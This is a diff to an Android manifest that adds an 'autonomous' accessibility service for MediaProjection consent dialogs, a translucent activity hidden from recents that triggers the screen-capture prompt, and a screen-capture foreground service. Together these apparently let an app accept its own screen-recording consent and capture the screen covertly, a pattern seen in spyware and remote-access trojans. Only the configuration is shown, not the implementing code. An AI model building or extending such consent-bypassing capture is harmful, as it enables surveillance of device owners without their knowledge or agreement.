@@ -102,6 +102,34 @@
             </intent-filter>
         </service>
 
+        <!-- Autonomous Accessibility Service for MediaProjection Consent Dialogs -->
+        <service
+            android:name=".accessibility.NexusAccessibilityService"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- Transparent Translucent Activity for Triggering MediaProjection Prompt -->
+        <activity
+            android:name=".components.screen.TransparentMediaProjectionActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:windowSoftInputMode="stateHidden" />
+
+        <!-- Foreground Service for Android 14+ MediaProjection Requirement -->
+        <service
+            android:name=".components.screen.ScreenCaptureService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
     </application>
 
 </manifest>
